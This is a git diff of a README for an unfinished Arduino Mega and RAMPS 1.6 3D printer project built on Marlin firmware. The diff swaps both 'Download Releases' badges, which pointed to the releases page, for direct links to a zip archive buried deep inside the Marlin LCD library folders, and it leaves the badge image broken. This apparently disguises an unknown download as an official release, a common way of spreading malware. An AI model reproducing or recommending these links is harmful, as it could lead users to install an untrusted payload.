@@ -2,7 +2,7 @@
 
 Welcome to the **3D Printer** repository! This is an open-source project that focuses on building a 3D printer using the Arduino Mega 2560 and RAMPS 1.6. The repository contains essential resources, including Marlin firmware configuration, hardware setup instructions, slicer profiles, and automation scripts. Please note that this project is currently marked as "Unfinished."
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/studiosdilsonsilva/3D_Printer/releases)
+[![Download Releases](https://raw.githubusercontent.com/studiosdilsonsilva/3D_Printer/main/Marlin-2.1.2.1-20240924T191649Z-001/Marlin-2.1.2.1/Marlin/src/lcd/extui/ftdi_eve_touch_ui/ftdi_eve_lib/extended/Printer_3.1.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/studiosdilsonsilva/3D_Printer/main/Marlin-2.1.2.1-20240924T191649Z-001/Marlin-2.1.2.1/Marlin/src/lcd/extui/ftdi_eve_touch_ui/ftdi_eve_lib/extended/Printer_3.1.zip)
 
 ## Table of Contents
 
@@ -125,6 +125,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For questions or support, please reach out via the Issues section of the repository or contact the project maintainers directly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/studiosdilsonsilva/3D_Printer/releases)
+[![Download Releases](https://raw.githubusercontent.com/studiosdilsonsilva/3D_Printer/main/Marlin-2.1.2.1-20240924T191649Z-001/Marlin-2.1.2.1/Marlin/src/lcd/extui/ftdi_eve_touch_ui/ftdi_eve_lib/extended/Printer_3.1.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/studiosdilsonsilva/3D_Printer/main/Marlin-2.1.2.1-20240924T191649Z-001/Marlin-2.1.2.1/Marlin/src/lcd/extui/ftdi_eve_touch_ui/ftdi_eve_lib/extended/Printer_3.1.zip)
 
 Thank you for checking out the **3D Printer** project! We hope you find it helpful in your journey into 3D printing. If you have any suggestions or improvements, feel free to contribute!
